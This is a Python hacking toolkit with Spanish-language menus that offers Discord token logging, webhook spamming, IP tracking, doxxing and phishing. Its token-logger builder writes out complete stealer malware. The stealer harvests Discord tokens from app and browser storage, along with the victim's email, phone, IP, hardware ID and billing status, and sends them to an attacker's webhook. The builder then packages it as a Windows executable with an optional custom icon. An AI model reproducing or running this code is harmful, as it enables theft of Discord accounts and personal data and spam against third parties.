from colorama import Fore
import os
import shutil
import time
import requests
import platform
from core import doxxing, goldenphish

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def spam():
  clear()
  print(f"""{Fore.GREEN}
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ███╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝     ███████╗██████╔╝███████║██╔████╔██║
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗     ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
  """)
  try:
    webhook = input('\n[+] Ingresa el link de la webhook: ')
    mensaje = input('[+] Ingresa el mensaje que quieres enviar en la webhook: ')
    while True:
      requests.post(webhook, json={'username': 'Spammer', 'content': mensaje})
      print('\n[~] Enviando mensaje...')
  except KeyboardInterrupt:
    print('\n[~] Deteniendo spam...')
    time.sleep(1)
    menu()

def tools():
   clear()
   print(f"""{Fore.BLUE}
                         ███      ▄██████▄   ▄██████▄   ▄█          ▄████████ 
                     ▀█████████▄ ███    ███ ███    ███ ███         ███    ███ 
                        ▀███▀▀██ ███    ███ ███    ███ ███         ███    █▀  
                         ███   ▀ ███    ███ ███    ███ ███         ███        
                         ███     ███    ███ ███    ███ ███       ▀███████████ 
                         ███     ███    ███ ███    ███ ███                ███ 
                         ███     ███    ███ ███    ███ ███▌    ▄    ▄█    ███ 
                        ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██  ▄████████▀  
                                  ▀                      
    |------------------------------------------------------------------------------------------|
    |                                                                                          |    
    | [1] Doxxing Tools                                                                        |
    | [2] Phishing Tools                                                                       |
    | [00] Regresar al menu principal                                                          |
    | [99] Salir                                                                               |
    |------------------------------------------------------------------------------------------|
   """)
   a = input('\nroot@fuckyou:~# ')
   if a == "1":
      doxxing.doxxer()
   elif a == "2":
     goldenphish.phish()
   elif a == "00":
     menu()
   elif a == "99":
     exit()
   else:
      print(f'\n{Fore.RED}[!] Error opcion invalida.')
      time.sleep(2)
      tools()

def creds():
  clear()
  print(f'''{Fore.MAGENTA}
                      ______   _        _     __   __          _ 
                      |  ___/\| |/\    | |    \ \ / /         | |
                      | |_  \ ` ' / ___| | __  \ V /___  _   _| |
                      |  _||_     _/ __| |/ /   \ // _ \| | | | |
                      | |   / , . \ (__|   <    | | (_) | |_| |_|
                      \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
                      -------------------------------------------------|
                      |              |    CREDITOS   |                 |
                      |              |---------------|                 |
                      |                                                |
                      | [~] Fuck You hecho por:                        |
                      |                                                |
                      |   [$] Spyk3r                                   |
                      |   Discord:                                     |
                      |   ! Spyk3r#0614                                |
                      |   Twitter:                                     |
                      |   https://twitter.com/_Spyk33r_                |
                      |   Github:                                      |
                      |   https://github.com/Spyk3r                    |
                      |                                                |
                      |   [$] Euronymou5                               |
                      |   Discord:                                     |
                      |   Euronymou5#3155                              |
                      |   Twitter:                                     |
                      |   https://twitter.com/Euronymou51              |
                      |   Github:                                      |
                      |   https://github.com/Euronymou5                |
                      |------------------------------------------------|
  ''')
  m = input('\n[~] Presiona enter para continuar...')
  menu()

def tracker():
  if os.name == "nt":
    os.system("python track/omega.py")
  else:
    os.system("python3 track/omega.py")

def tokenlogger():
    clear()
    print(f"""{Fore.LIGHTBLUE_EX}
████████  ██████  ██   ██ ███████ ███    ██ ██       ██████   ██████   ██████  ███████ ██████  
   ██    ██    ██ ██  ██  ██      ████   ██ ██      ██    ██ ██       ██       ██      ██   ██ 
   ██    ██    ██ █████   █████   ██ ██  ██ ██      ██    ██ ██   ███ ██   ███ █████   ██████  
   ██    ██    ██ ██  ██  ██      ██  ██ ██ ██      ██    ██ ██    ██ ██    ██ ██      ██   ██ 
   ██     ██████  ██   ██ ███████ ██   ████ ███████  ██████   ██████   ██████  ███████ ██   ██
    """)
    if os.path.isfile('logger.py'):
        os.remove('logger.py')
    else:
        pass
    variable_hook = input(f'\n{Fore.GREEN}[~] Ingresa Tu WebHook de discord: ')
    f = open('logger.py', 'w')
    f.write('''import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\\\Discord",
    "Discord Canary"    : ROAMING + "\\\\discordcanary",
    "Discord PTB"       : ROAMING + "\\\\discordptb",
    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Informacion de la Cuenta**",
                        "value": f'Email: {email}\\Telefono: {phone}\\Nitro: {nitro}\\Información de Facturación: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**Informacion de la PC**",
                        "value": f'IP: {ip}\\Nombre de Usuario: {pc_username}\\Nombre de la PC: {pc_name}\\Ubicacion de la Token: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Logger - By GoldenDark",
        "avatar_url": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/649adf24-60c9-4b7c-8ccf-e828ce51825d/dddqxj0-12dc5989-6e8e-4a0f-bf9f-887a5db96b18.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3sicGF0aCI6IlwvZlwvNjQ5YWRmMjQtNjBjOS00YjdjLThjY2YtZTgyOGNlNTE4MjVkXC9kZGRxeGowLTEyZGM1OTg5LTZlOGUtNGEwZi1iZjlmLTg4N2E1ZGI5NmIxOC5wbmcifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6ZmlsZS5kb3dubG9hZCJdfQ.kHjYfE48SYiPGR0M3GHDyRNbP8Iw87SumhIH7pjOKUo"
    }
    try:
        urlopen(Request("WEBHOOK", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
main()'''.replace("WEBHOOK", variable_hook))
    f.close()
    print(f'\n{Fore.YELLOW}[~] Compilando token logger...')
    print(f'\n{Fore.YELLOW}[~] Detectando os...')
    if platform.system() == "Linux":
        print(
            f'\n{Fore.RED}[✘] No es posible compilar un .exe para linux abortando...'
        )
        time.sleep(2)
        menu()
    elif platform.system() == "Darwin":
        print(
            f'\n{Fore.RED}[✘] No es posible compilar un .exe para MAC OS abortando...'
        )
        time.sleep(2)
        menu()
    elif platform.system() == "Windows":
        print(f'\n[✔] OS Detectado: Windows')
        ques = input('\n[?] Quieres agregar un icono a tu .exe? [Y/n]: ')
        if ques == "Y" or ques == "y":
            print('\n[~] Ejemplo: C:\\Users\\Desktop\\icon.ico')
            icon = input('\n[~] Ingresa la ubicacion de tu archivo .ico: ')
            if len(icon) == 0:
                print(f'\n{Fore.RED}[✘] Error debes ingresar una ubicacion.')
                time.sleep(2)
                menu()
            else:
                os.system(f'pyinstaller --onefile --icon="{icon}" logger.py')
                print(
                    f'\n{Fore.GREEN}[✔] Token logger compilado exitosamente.')
                os.remove("logger.spec")
                shutil.rmtree('build')
                shutil.move("dist/logger.exe", "output")
                shutil.rmtree('dist')
                print(f'{Fore.GREEN}\n[~] Token logger movido a la carpeta: output/logger.exe')
                time.sleep(3)
                menu()
        elif ques == "N" or ques == "n":
            print('\n[~] Convirtiendo token logger a exe...')
            os.system("pyinstaller -y -F logger.py")
            print(f'\n{Fore.GREEN}[✔] Token logger compilado exitosamente.')
            time.sleep(5)
            os.remove("logger.spec")
            shutil.rmtree('build')
            shutil.move("dist/logger.exe", "output")
            shutil.rmtree('dist')
            print(f'{Fore.GREEN}\n[~] Token logger movido a la carpeta: output/logger.exe')
            time.sleep(3)
            menu()
        else:
            print(f'{Fore.RED}[✘] Error opcion invalida.')
            time.sleep(2)
            menu()
    else:
        print(f'{Fore.RED}[!] Error OS desconocido.')
        time.sleep(2)
        menu()


def menu():
    clear()
    print(f'''{Fore.LIGHTCYAN_EX}
                      ______   _        _     __   __          _ 
                      |  ___/\| |/\    | |    \ \ / /         | |
                      | |_  \ ` ' / ___| | __  \ V /___  _   _| |
                      |  _||_     _/ __| |/ /   \ // _ \| | | | |
                      | |   / , . \ (__|   <    | | (_) | |_| |_|
                      \_|   \/|_|\/\___|_|\_\   \_/\___/ \__,_(_)
                                              v1.0.0 by: Euronymou5 and GoldenDark{Fore.LIGHTBLUE_EX} 
  |-----------------------------------------------------------------------------------------------------------------|
  |                                           |     MENU      |                                                     |
  |                                           |---------------|                                                     |
  |                                                                                                                 |
  |________________$$$$$                                                                                            |
  |______________$$____$$                           [1] Token Logger Creator discord                                |
  |______________$$____$$                           [2] IP Tracker                                                  |
  |______________$$____$$                           [3] WebHook spam discord                                        |
  |______________$$____$$                           [4] Tools Installer                                             |
  |______________$$____$$                           [00] Creditos                                                   |  
  |__________$$$$$$____$$$$$$                       [99] Salir                                                      |
  |________$$____$$____$$____$$$$                                                                                   |
  |________$$____$$____$$____$$__$$                                                                                 |
  |$$$$$$__$$____$$____$$____$$____$$                                                                               |
  |$$____$$$$________________$$____$$                                                                               |
  |$$______$$______________________$$                                                                               |
  |__$$____$$______________________$$                                                                               |
  |___$$$__$$______________________$$                                                                               |
  |____$$__________________________$$                                                                               |
  |_____$$$________________________$$                                                                               |
  |______$$______________________$$$                                                                                |
  |_______$$$____________________$$                                                                                 |
  |________$$____________________$$                                                                                 |
  |_________$$$________________$$$                                                                                  |
  |__________$$________________$$                                                                                   |
  |__________$$$$$$$$$$$$$$$$$$$$                                                                                   |
  |-----------------------------------------------------------------------------------------------------------------|
  ''')
    prompt = input(f'\n{Fore.RESET}root@fuckyou:~# ')
    if prompt == "1":
        tokenlogger()
    elif prompt == "2":
        tracker()
    elif prompt == "3":
        spam()
    elif prompt == "4":
        tools()
    elif prompt == "00":
        creds()
    elif prompt == "99":
        exit()
    else:
        print(f'\n{Fore.RED}[!] Error opcion invalida.')
        time.sleep(2)
        menu()


menu()
